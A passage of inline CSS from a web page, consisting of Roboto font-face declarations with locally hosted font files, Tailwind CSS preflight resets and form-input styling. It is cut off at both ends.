            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .drawer-bottom-close {
            bottom: -100%
        }

        .drawer-bottom-open {
            bottom: 0
        }
    </style>
    <style>
        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkC3kaSTbQWt4N-1Gqmqiyt4C.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: "Roboto Fallback: Arial";
            src: local("Arial");
            size-adjust: 99.7809%;
            ascent-override: 92.9771%;
            descent-override: 24.4677%;
            line-gap-override: 0%
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkAnkaSTbQWt4N-sD6bk8h5jq.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkCnkaSTbQWt4N-ZGmIdoUmuh.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+1F00-1FFF;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkBXkaSTbQWt4N-wZkBreDDBo.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkenkaSTbQWt4N-Oa8aDQXSPr.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkaHkaSTbQWt4N-o0vFJna4VD.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkCXkaSTbQWt4N-5VrJUOFyHK.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkCHkaSTbQWt4N-Xw1l95Ik6l.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable Italic"), url(/_fonts/KFO5CnqEu92Fr1Mu53ZEC9_Vu3r1gIhOszmkBnkaSTbQWg-Yv74MbCyur.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            font-weight: 100 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBHMdazTgWw-4K4q18OJrt.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBHMdazTgWw-vT9cSax8rF.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBHMdazTgWw-K8Lh0hp2vH.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+1F00-1FFF;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBHMdazTgWw-YrRXIKDjCl.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBHMdazTgWw-iKD1HzYF4n.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBHMdazTgWw-J4rkDdodqF.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBHMdazTgWw-Idwi1wmrw9.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBHMdazTgWw-utknTOpabV.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Variable"), url(/_fonts/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBHMdazQ-cvmF4ClVmB.woff2) format(woff2);
            font-display: swap;
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            font-weight: 100 900;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Thin Italic"), url(/_fonts/fonts.gstatic-hF0kAhDfD0.woff) format(woff);
            font-display: swap;
            font-weight: 100;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto ExtraLight Italic"), url(/_fonts/fonts.gstatic-Y4ETfQHFP4.woff) format(woff);
            font-display: swap;
            font-weight: 200;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Light Italic"), url(/_fonts/fonts.gstatic-wCY6IOREuQ.woff) format(woff);
            font-display: swap;
            font-weight: 300;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Regular Italic"), local("Roboto Italic"), url(/_fonts/fonts.gstatic-e8Z48uHaeX.woff) format(woff);
            font-display: swap;
            font-weight: 400;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Medium Italic"), url(/_fonts/fonts.gstatic-KJuTR9RD4n.woff) format(woff);
            font-display: swap;
            font-weight: 500;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto SemiBold Italic"), url(/_fonts/fonts.gstatic-sU6SXrj9Eb.woff) format(woff);
            font-display: swap;
            font-weight: 600;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Bold Italic"), url(/_fonts/fonts.gstatic-L1NBMZQ9sR.woff) format(woff);
            font-display: swap;
            font-weight: 700;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto ExtraBold Italic"), url(/_fonts/fonts.gstatic-QJ9ZuPv9g7.woff) format(woff);
            font-display: swap;
            font-weight: 800;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Black Italic"), url(/_fonts/fonts.gstatic-CvxUUBc4ta.woff) format(woff);
            font-display: swap;
            font-weight: 900;
            font-style: italic
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Thin"), url(/_fonts/fonts.gstatic-IlUNR3lCb3.woff) format(woff);
            font-display: swap;
            font-weight: 100;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto ExtraLight"), url(/_fonts/fonts.gstatic-OJIwoHnRJT.woff) format(woff);
            font-display: swap;
            font-weight: 200;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Light"), url(/_fonts/fonts.gstatic-eGUIrWXMGw.woff) format(woff);
            font-display: swap;
            font-weight: 300;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Regular"), local("Roboto"), url(/_fonts/fonts.gstatic-neZchVnPML.woff) format(woff);
            font-display: swap;
            font-weight: 400;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Medium"), url(/_fonts/fonts.gstatic-IwDS9IRkVY.woff) format(woff);
            font-display: swap;
            font-weight: 500;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto SemiBold"), url(/_fonts/fonts.gstatic-0NYTcdOziX.woff) format(woff);
            font-display: swap;
            font-weight: 600;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Bold"), url(/_fonts/fonts.gstatic-leAk5MjWQi.woff) format(woff);
            font-display: swap;
            font-weight: 700;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto ExtraBold"), url(/_fonts/fonts.gstatic-QjZiizu3Lf.woff) format(woff);
            font-display: swap;
            font-weight: 800;
            font-style: normal
        }

        @font-face {
            font-family: Roboto;
            src: local("Roboto Black"), url(/_fonts/fonts.gstatic-A689qIDHSW.woff) format(woff);
            font-display: swap;
            font-weight: 900;
            font-style: normal
        }

        *,
        :after,
        :before {
            --tw-border-spacing-x: 0;
            --tw-border-spacing-y: 0;
            --tw-translate-x: 0;
            --tw-translate-y: 0;
            --tw-rotate: 0;
            --tw-skew-x: 0;
            --tw-skew-y: 0;
            --tw-scale-x: 1;
            --tw-scale-y: 1;
            --tw-pan-x: ;
            --tw-pan-y: ;
            --tw-pinch-zoom: ;
            --tw-scroll-snap-strictness: proximity;
            --tw-gradient-from-position: ;
            --tw-gradient-via-position: ;
            --tw-gradient-to-position: ;
            --tw-ordinal: ;
            --tw-slashed-zero: ;
            --tw-numeric-figure: ;
            --tw-numeric-spacing: ;
            --tw-numeric-fraction: ;
            --tw-ring-inset: ;
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: rgba(59, 130, 246, .5);
            --tw-ring-offset-shadow: 0 0 #0000;
            --tw-ring-shadow: 0 0 #0000;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            --tw-blur: ;
            --tw-brightness: ;
            --tw-contrast: ;
            --tw-grayscale: ;
            --tw-hue-rotate: ;
            --tw-invert: ;
            --tw-saturate: ;
            --tw-sepia: ;
            --tw-drop-shadow: ;
            --tw-backdrop-blur: ;
            --tw-backdrop-brightness: ;
            --tw-backdrop-contrast: ;
            --tw-backdrop-grayscale: ;
            --tw-backdrop-hue-rotate: ;
            --tw-backdrop-invert: ;
            --tw-backdrop-opacity: ;
            --tw-backdrop-saturate: ;
            --tw-backdrop-sepia: ;
            --tw-contain-size: ;
            --tw-contain-layout: ;
            --tw-contain-paint: ;
            --tw-contain-style:
        }

        ::backdrop {
            --tw-border-spacing-x: 0;
            --tw-border-spacing-y: 0;
            --tw-translate-x: 0;
            --tw-translate-y: 0;
            --tw-rotate: 0;
            --tw-skew-x: 0;
            --tw-skew-y: 0;
            --tw-scale-x: 1;
            --tw-scale-y: 1;
            --tw-pan-x: ;
            --tw-pan-y: ;
            --tw-pinch-zoom: ;
            --tw-scroll-snap-strictness: proximity;
            --tw-gradient-from-position: ;
            --tw-gradient-via-position: ;
            --tw-gradient-to-position: ;
            --tw-ordinal: ;
            --tw-slashed-zero: ;
            --tw-numeric-figure: ;
            --tw-numeric-spacing: ;
            --tw-numeric-fraction: ;
            --tw-ring-inset: ;
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: rgba(59, 130, 246, .5);
            --tw-ring-offset-shadow: 0 0 #0000;
            --tw-ring-shadow: 0 0 #0000;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            --tw-blur: ;
            --tw-brightness: ;
            --tw-contrast: ;
            --tw-grayscale: ;
            --tw-hue-rotate: ;
            --tw-invert: ;
            --tw-saturate: ;
            --tw-sepia: ;
            --tw-drop-shadow: ;
            --tw-backdrop-blur: ;
            --tw-backdrop-brightness: ;
            --tw-backdrop-contrast: ;
            --tw-backdrop-grayscale: ;
            --tw-backdrop-hue-rotate: ;
            --tw-backdrop-invert: ;
            --tw-backdrop-opacity: ;
            --tw-backdrop-saturate: ;
            --tw-backdrop-sepia: ;
            --tw-contain-size: ;
            --tw-contain-layout: ;
            --tw-contain-paint: ;
            --tw-contain-style:
        }

        /*! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com*/
        *,
        :after,
        :before {
            border: 0 solid #e5e7eb;
            box-sizing: border-box
        }

        :after,
        :before {
            --tw-content: ""
        }

        :host,
        html {
            line-height: 1.5;
            -webkit-text-size-adjust: 100%;
            font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
            font-feature-settings: normal;
            font-variation-settings: normal;
            -moz-tab-size: 4;
            -o-tab-size: 4;
            tab-size: 4;
            -webkit-tap-highlight-color: transparent
        }

        body {
            line-height: inherit;
            margin: 0
        }

        hr {
            border-top-width: 1px;
            color: inherit;
            height: 0
        }

        abbr:where([title]) {
            -webkit-text-decoration: underline dotted;
            text-decoration: underline dotted
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            font-size: inherit;
            font-weight: inherit
        }

        a {
            color: inherit;
            text-decoration: inherit
        }

        b,
        strong {
            font-weight: bolder
        }

        code,
        kbd,
        pre,
        samp {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, Liberation Mono, Courier New, monospace;
            font-feature-settings: normal;
            font-size: 1em;
            font-variation-settings: normal
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sub {
            bottom: -.25em
        }

        sup {
            top: -.5em
        }

        table {
            border-collapse: collapse;
            border-color: inherit;
            text-indent: 0
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font-family: inherit;
            font-feature-settings: inherit;
            font-size: 100%;
            font-variation-settings: inherit;
            font-weight: inherit;
            letter-spacing: inherit;
            line-height: inherit;
            margin: 0;
            padding: 0
        }

        button,
        select {
            text-transform: none
        }

        button,
        input:where([type=button]),
        input:where([type=reset]),
        input:where([type=submit]) {
            appearance: button;
            background-color: transparent;
            background-image: none
        }

        :-moz-focusring {
            outline: auto
        }

        :-moz-ui-invalid {
            box-shadow: none
        }

        progress {
            vertical-align: baseline
        }

        ::-webkit-inner-spin-button,
        ::-webkit-outer-spin-button {
            height: auto
        }

        [type=search] {
            appearance: textfield;
            outline-offset: -2px
        }

        ::-webkit-search-decoration {
            -webkit-appearance: none
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        summary {
            display: list-item
        }

        blockquote,
        dd,
        dl,
        figure,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        hr,
        p,
        pre {
            margin: 0
        }

        fieldset {
            margin: 0
        }

        fieldset,
        legend {
            padding: 0
        }

        menu,
        ol,
        ul {
            list-style: none;
            margin: 0;
            padding: 0
        }

        dialog {
            padding: 0
        }

        textarea {
            resize: vertical
        }

        input::-moz-placeholder,
        textarea::-moz-placeholder {
            color: #9ca3af;
            opacity: 1
        }

        input::placeholder,
        textarea::placeholder {
            color: #9ca3af;
            opacity: 1
        }

        [role=button],
        button {
            cursor: pointer
        }

        :disabled {
            cursor: default
        }

        audio,
        canvas,
        embed,
        iframe,
        img,
        object,
        svg,
        video {
            vertical-align: middle
        }

        img,
        video {
            height: auto;
            max-width: 100%
        }

        [hidden]:where(:not([hidden=until-found])) {
            display: none
        }

        [multiple],
        [type=date],
        [type=datetime-local],
        [type=email],
        [type=month],
        [type=number],
        [type=password],
        [type=search],
        [type=tel],
        [type=text],
        [type=time],
        [type=url],
        [type=week],
        input:where(:not([type])),
        select,
        textarea {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-color: #fff;
            border-color: #6b7280;
            border-radius: 0;
            border-width: 1px;
            font-size: 1rem;
            line-height: 1.5rem;
            padding: .5rem .75rem;
            --tw-shadow: 0 0 #0000
        }

        [multiple]:focus,
        [type=date]:focus,
        [type=datetime-local]:focus,
        [type=email]:focus,
        [type=month]:focus,
        [type=number]:focus,
        [type=password]:focus,
        [type=search]:focus,
        [type=tel]:focus,
        [type=text]:focus,
        [type=time]:focus,
        [type=url]:focus,
        [type=week]:focus,
        input:where(:not([type])):focus,
        select:focus,
        textarea:focus {
            outline: 2px solid transparent;
            outline-offset: 2px;
            --tw-ring-inset: var(--tw-empty, );
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #2563eb;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            border-color: #2563eb;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
        }

        input::-moz-placeholder,
        textarea::-moz-placeholder {
            color: #6b7280;
            opacity: 1
        }

        input::placeholder,
        textarea::placeholder {
            color: #6b7280;
            opacity: 1
        }

        ::-webkit-datetime-edit-fields-wrapper {
            padding: 0
        }

        ::-webkit-date-and-time-value {
            min-height: 1.5em;
            text-align: inherit
        }

        ::-webkit-datetime-edit {
            display: inline-flex
        }

        ::-webkit-datetime-edit,
        ::-webkit-datetime-edit-day-field,
        ::-webkit-datetime-edit-hour-field,
        ::-webkit-datetime-edit-meridiem-field,
        ::-webkit-datetime-edit-millisecond-field,
        ::-webkit-datetime-edit-minute-field,
        ::-webkit-datetime-edit-month-field,
        ::-webkit-datetime-edit-second-field,
        ::-webkit-datetime-edit-year-field {
            padding-bottom: 0;
            padding-top: 0
        }

        select {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");
            background-position: right .5rem center;
            background-repeat: no-repeat;
            background-size: 1.5em 1.5em;
            padding-right: 2.5rem;
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact
        }

        [multiple],
        [size]:where(select:not([size="1"])) {
            background-image: none;
            background-position: 0 0;
            background-repeat: unset;
            background-size: initial;
            padding-right: .75rem;
            -webkit-print-color-adjust: unset;
            print-color-adjust: unset
        }

        [type=checkbox],
        [type=radio] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-color: #fff;
            background-origin: border-box;
            border-color: #6b7280;
            border-width: 1px;
            color: #2563eb;
            display: inline-block;
            flex-shrink: 0;
            height: 1rem;
            padding: 0;
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            vertical-align: middle;
            width: 1rem;
            --tw-shadow: 0 0 #0000
        }

        [type=checkbox] {
            border-radius: 0
        }

        [type=radio] {
            border-radius: 100%
        }

        [type=checkbox]:focus,
        [type=radio]:focus {
            outline: 2px solid transparent;
            outline-offset: 2px;
            --tw-ring-inset: var(--tw-empty, );
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #2563eb;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
        }

        [type=checkbox]:checked,
        [type=radio]:checked {
            background-color: currentColor;
            background-position: 50%;
            background-repeat: no-repeat;
            background-size: 100% 100%;
            border-color: transparent
        }

        [type=checkbox]:checked {
